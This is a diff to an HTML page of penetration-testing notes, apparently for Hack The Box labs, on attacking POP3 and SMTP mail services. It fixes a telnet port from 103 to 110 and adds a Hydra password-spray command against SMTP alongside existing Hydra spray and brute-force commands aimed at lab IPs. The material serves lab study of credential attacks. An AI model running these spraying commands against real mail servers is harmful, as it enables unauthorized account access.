@@ -27,8 +27,8 @@
             <h2>Usage</h2>
             <ul>
                 <p>Once you have a username and password you can attemp to login by doing:</p>
-                <p>Remeber that if you previously performed an attack over the port 103 also attempt to login through this port</p>
-                <pre><code class="language-bash">telnet 10.10.10.101 103</code></pre>
+                <p>Remeber that if you previously performed an attack over the port 110 also attempt to login through this port</p>
+                <pre><code class="language-bash">telnet 10.10.10.101 110</code></pre>
                 <p>Once inside type</p>
                 <pre><code class="language-bash">USER yourusername@example.htb
 PASS PasswordForthatUser</code></pre>
@@ -119,6 +119,8 @@ RCPT TO:john
                 <ul>
                     <p>Cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked </p>
                     <pre><code class="language-bash">hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code></pre>
+                    <p>by default you should use smtp</p>
+                    <pre><code class="language-bash">hydra -L users.txt -p 'Company01!' -f 10.10.110.20 smtp</code></pre>
                     <p>You can also perform on user and a lot of passwords</p>
                     <p>Important things after performing this attack. It is possible that you need to specify all FQDN for the username meaning: user@mydomain.com</p>
                     <pre><code class="language-bash">hydra -l user -P passwords.txt -f 10.10.110.20 pop3</code></pre>
